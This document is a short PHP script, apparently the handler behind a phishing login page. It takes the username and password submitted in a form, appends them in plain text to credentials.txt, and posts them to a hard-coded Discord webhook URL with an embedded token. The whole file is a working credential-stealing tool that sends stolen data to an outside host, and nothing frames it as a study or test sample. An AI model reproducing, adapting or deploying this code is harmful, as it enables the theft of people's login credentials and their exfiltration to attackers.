<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save credentials to a file
    $file = 'credentials.txt';
    $current = file_get_contents($file);
    $current .= "Username: $username, Password: $password\n";
    file_put_contents($file, $current);

    // Send credentials to Discord
    $webhookUrl = 'https://discordapp.com/api/webhooks/1509306258694471724/-1l5zsuYYl7Yy_HaHvJEWVP30rfZPhnBefaNyPXuBxZzC_tPsVl9n0s3OZc3c8GFq99A';
    $data = [
        'content' => "New credentials:\nUsername: $username\nPassword: $password"
    ];
    $options = [
        'http' => [
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
        ],
    ];
    $context  = stream_context_create($options);
    $result = file_get_contents($webhookUrl, false, $context);
    if ($result === FALSE) {
        die('Error');
    }
}
?>
